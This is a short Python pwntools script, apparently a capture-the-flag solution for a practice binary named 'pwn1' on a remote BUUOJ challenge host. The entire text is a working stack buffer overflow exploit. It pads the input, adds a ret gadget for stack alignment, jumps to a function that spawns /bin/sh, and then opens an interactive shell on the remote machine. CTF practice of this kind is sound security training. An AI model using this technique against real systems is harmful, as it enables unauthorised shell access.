from pwn import *

binfile = "./pwn1"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

fun = elf.symbols['fun']
HOST='node4.buuoj.cn'
PORT=26978

# conn = process(binfile)
conn = remote(HOST, PORT)
sleep(1)

# padding + ret(8byte, allignment) + fun(=/bin/sh)
payload = b'a' * 23 + p64(ret) + p64(fun)

conn.sendline(payload)
conn.interactive()
